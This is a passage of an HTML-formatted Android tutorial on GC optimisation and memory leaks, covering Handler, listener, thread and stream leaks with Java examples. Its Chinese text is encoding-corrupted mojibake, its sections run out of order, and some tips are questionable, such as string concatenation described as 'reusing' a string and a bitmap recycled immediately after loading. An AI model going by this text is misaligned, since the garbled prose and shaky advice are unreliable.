<h5 data-id="heading-41">4.2.3 ä¼˜åŒ–æ•°æ®ç»“æ„</h5>
<p><strong>é€‰æ‹©åˆé€‚çš„é›†åˆç±»ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¦‚æœéœ€è¦éšæœºè®¿é—®ï¼Œç”¨ArrayList</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// éšæœºè®¿é—®å¿«</span>

<span class="hljs-comment">// å¦‚æœéœ€è¦é¢‘ç¹æ’å…¥åˆ é™¤ï¼Œç”¨LinkedList</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();  <span class="hljs-comment">// æ’å…¥åˆ é™¤å¿«</span>
</code></pre>
<p><strong>é¿å…å†…å­˜æµªè´¹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä¸æ¸…ç†é›†åˆ</span>
List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-comment">// ... ä½¿ç”¨list</span>
<span class="hljs-comment">// listä¸å†ä½¿ç”¨ï¼Œä½†æ²¡æœ‰æ¸…ç†</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶æ¸…ç†</span>
list.clear();
list = <span class="hljs-literal">null</span>;
</code></pre>
<h5 data-id="heading-42">4.2.4 é¿å…å†…å­˜æ³„æ¼</h5>
<p><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> Handler handler;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>(<span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onDestroy();
        <span class="hljs-comment">// æ¸…ç†Handlerï¼Œé¿å…å†…å­˜æ³„æ¼</span>
        handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
        handler = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>é¿å…æŒæœ‰Activity/Contextçš„å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé™æ€å˜é‡æŒæœ‰Activity</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨Application Context</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Context appContext;  <span class="hljs-comment">// ä½¿ç”¨Application Context</span>
</code></pre>
<p><strong>ä½¿ç”¨å¼±å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨å¼±å¼•ç”¨é¿å…å†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<h4 data-id="heading-43">4.3 GCä¼˜åŒ–å®è·µåœºæ™¯</h4>
<h5 data-id="heading-44">4.3.1 åˆ—è¡¨æ»‘åŠ¨ä¼˜åŒ–</h5>
<p><strong>RecyclerViewçš„ViewHolderå¤ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter&lt;MyAdapter.ViewHolder&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {
        <span class="hljs-comment">// ViewHolderå¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</span>
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> LayoutInflater.from(parent.getContext())
            .inflate(R.layout.item, parent, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewHolder</span>(view);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-comment">// é¿å…åœ¨è¿™é‡Œåˆ›å»ºæ–°å¯¹è±¡</span>
        <span class="hljs-comment">// å¤ç”¨ViewHolderä¸­çš„View</span>
    }
}
</code></pre>
<p><strong>é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºæ–°å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
}
</code></pre>
<h5 data-id="heading-45">4.3.2 åŠ¨ç”»æ€§èƒ½ä¼˜åŒ–</h5>
<p><strong>å¤ç”¨åŠ¨ç”»å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ¯æ¬¡åˆ›å»ºæ–°åŠ¨ç”»</span>
button.setOnClickListener(v -&gt; {
    <span class="hljs-type">ObjectAnimator</span> <span class="hljs-variable">animator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectAnimator</span>();  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»º</span>
    animator.start();
});

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨åŠ¨ç”»å¯¹è±¡</span>
<span class="hljs-keyword">private</span> ObjectAnimator animator;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
    animator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectAnimator</span>();
}

button.setOnClickListener(v -&gt; {
    animator.start();  <span class="hljs-comment">// å¤ç”¨</span>
});
</code></pre>
<h5 data-id="heading-46">4.3.3 å›¾ç‰‡åŠ è½½ä¼˜åŒ–</h5>
<p><strong>ä½¿ç”¨å›¾ç‰‡ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨Glideç­‰åº“ï¼Œè‡ªåŠ¨ç¼“å­˜</span>
Glide.with(context)
    .load(url)
    .into(imageView);
</code></pre>
<p><strong>åŠæ—¶é‡Šæ”¾ä¸ç”¨çš„Bitmapï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (bitmap != <span class="hljs-literal">null</span>) {
        bitmap.recycle();
        bitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>é¿å…åŠ è½½è¿‡å¤§çš„å›¾ç‰‡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åŠ è½½æ—¶å‹ç¼©å›¾ç‰‡</span>
BitmapFactory.<span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitmapFactory</span>.Options();
options.inSampleSize = <span class="hljs-number">2</span>;  <span class="hljs-comment">// å‹ç¼©2å€</span>
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeFile(path, options);
</code></pre>
<h5 data-id="heading-47">4.3.4 å¤§å¯¹è±¡å¤„ç†ä¼˜åŒ–</h5>
<p><strong>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Bitmap largeBitmap;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadImage</span><span class="hljs-params">()</span> {
    largeBitmap = loadLargeBitmap();
    <span class="hljs-comment">// ä½¿ç”¨å®ŒååŠæ—¶é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (largeBitmap != <span class="hljs-literal">null</span>) {
        largeBitmap.recycle();
        largeBitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-48">4.2 å†…å­˜æ³„æ¼ï¼ˆMemory Leakï¼‰</h4>
<h4 data-id="heading-49">4.2.1 ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼</h4>
<p><strong>å®šä¹‰ï¼š</strong> å¯¹è±¡å·²ç»ä¸å†ä½¿ç”¨ï¼Œä½†å› ä¸ºè¢«å¼•ç”¨æ— æ³•è¢«GCå›æ”¶ï¼Œå¯¼è‡´å†…å­˜æµªè´¹</p>
<p><strong>ä¸å†…å­˜æº¢å‡ºçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>å†…å­˜æº¢å‡º</strong>ï¼šå†…å­˜çœŸçš„ä¸å¤Ÿç”¨äº†ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li>åº”ç”¨å˜æ…¢ï¼Œå¯èƒ½è¢«ç³»ç»Ÿæ€æ­»</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryLeak</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œæ— æ³•å›æ”¶</span>
        <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«GCå›æ”¶</span>
    }
}
</code></pre>
<h4 data-id="heading-50">4.2.2 Androidä¸­å¸¸è§çš„å†…å­˜æ³„æ¼åœºæ™¯</h4>
<h5 data-id="heading-51">4.2.2.1 Activity/Contextæ³„æ¼</h5>
<p><strong>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activity</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activity = <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// Activityæ— æ³•è¢«å›æ”¶</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨å¼±å¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> WeakReference&lt;Activity&gt; activityRef;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(<span class="hljs-built_in">this</span>);
    }
}
</code></pre>
<p><strong>å•ä¾‹æŒæœ‰Contextå¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæŒæœ‰Activity Context</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySingleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> MySingleton instance;
    <span class="hljs-keyword">private</span> Context context;
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MySingleton</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">this</span>.context = context;  <span class="hljs-comment">// å¦‚æœæ˜¯Activity Contextï¼Œä¼šæ³„æ¼</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MySingleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySingleton</span>(context);
        }
        <span class="hljs-keyword">return</span> instance;
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨Application Context</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySingleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> MySingleton instance;
    <span class="hljs-keyword">private</span> Context context;
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MySingleton</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">this</span>.context = context.getApplicationContext();  <span class="hljs-comment">// ä½¿ç”¨Application Context</span>
    }
}
</code></pre>
<p><strong>å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šHandlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨</span>
        }
    };
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨é™æ€å†…éƒ¨ç±»+å¼±å¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
        <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
        
        MyHandler(Activity activity) {
            activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
            <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// ä½¿ç”¨activity</span>
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-52">4.2.2.2 ç›‘å¬å™¨æ³„æ¼</h5>
<p><strong>EventBusæœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        EventBus.getDefault().register(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¿˜è®°å–æ¶ˆæ³¨å†Œï¼ŒEventBusæŒæœ‰Activityå¼•ç”¨ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
}
</code></pre>
<p><strong>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">BroadcastReceiver</span> <span class="hljs-variable">receiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastReceiver</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> {
            <span class="hljs-comment">// å¤„ç†å¹¿æ’­</span>
        }
    };
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        registerReceiver(receiver, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntentFilter</span>(<span class="hljs-string">"ACTION"</span>));  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¿˜è®°å–æ¶ˆæ³¨å†Œï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (receiver != <span class="hljs-literal">null</span>) {
        unregisterReceiver(receiver);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
    }
}
</code></pre>
<p><strong>å…¶ä»–ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        someView.setOnClickListener(listener);  <span class="hljs-comment">// æ³¨å†Œ</span>
        someObject.setOnDataChangedListener(listener);  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¦‚æœè¿™äº›ç›‘å¬å™¨æŒæœ‰Activityå¼•ç”¨ï¼Œå¿˜è®°å–æ¶ˆæ³¨å†Œä¼šå¯¼è‡´æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    someView.setOnClickListener(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
    someObject.setOnDataChangedListener(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
}
</code></pre>
<h5 data-id="heading-53">4.2.2.3 é›†åˆç±»æ³„æ¼</h5>
<p><strong>é›†åˆä¸­ä¿å­˜äº†å¯¹è±¡ï¼Œä½†å¿˜è®°æ¸…ç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé›†åˆæ³„æ¼</span>
<span class="hljs-keyword">private</span> List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addObject</span><span class="hljs-params">(Object obj)</span> {
    list.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«listå¼•ç”¨</span>
    <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«å›æ”¶</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶æ¸…ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObject</span><span class="hljs-params">(Object obj)</span> {
    list.remove(obj);
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    list.clear();  <span class="hljs-comment">// æ¸…ç†é›†åˆ</span>
}
</code></pre>
<h5 data-id="heading-54">4.2.2.4 çº¿ç¨‹æ³„æ¼</h5>
<p><strong>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šçº¿ç¨‹æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> Thread thread;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        thread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// çº¿ç¨‹æŒæœ‰Activityå¼•ç”¨</span>
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// æ— é™å¾ªç¯ï¼Œçº¿ç¨‹ä¸ç»“æŸ</span>
            }
        });
        thread.start();
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šæ­£ç¡®ç®¡ç†çº¿ç¨‹</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) {
        thread.interrupt();  <span class="hljs-comment">// ä¸­æ–­çº¿ç¨‹</span>
    }
}
</code></pre>
<h5 data-id="heading-55">4.2.2.5 èµ„æºæœªå…³é—­</h5>
<p><strong>æ–‡ä»¶æµæœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ–‡ä»¶æµæœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>);
    <span class="hljs-comment">// ä½¿ç”¨fis</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­ï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨try-with-resources</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>)) {
        <span class="hljs-comment">// ä½¿ç”¨fis</span>
        <span class="hljs-comment">// è‡ªåŠ¨å…³é—­</span>
    } <span class="hljs-keyword">catch</span> (IOException e) {
        e.printStackTrace();
    }
}
</code></pre>
<p><strong>æ•°æ®åº“è¿æ¥æœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ•°æ®åº“è¿æ¥æœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryDatabase</span><span class="hljs-params">()</span> {
    <span class="hljs-type">SQLiteDatabase</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> getWritableDatabase();
